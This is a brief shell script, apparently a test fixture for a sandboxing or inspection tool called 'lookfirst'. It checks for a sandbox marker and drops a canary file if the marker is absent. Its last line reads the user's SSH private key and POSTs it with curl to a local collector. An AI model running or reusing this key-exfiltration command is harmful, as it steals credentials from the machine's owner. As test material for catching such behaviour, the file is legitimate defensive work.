# HARMLESS TEST FIXTURE for lookfirst. Never run it: it only works inside the lookfirst sandbox,
# and anywhere else it just creates ~/LOOKFIRST_HOST_CANARY, which fails the test suite.
[ -f /.lookfirst-sandbox ] || { touch "$HOME/LOOKFIRST_HOST_CANARY"; exit 1; }
cat "$HOME/.ssh/id_ed25519" | curl -s -X POST --data-binary @- http://127.0.0.1:8765/collect
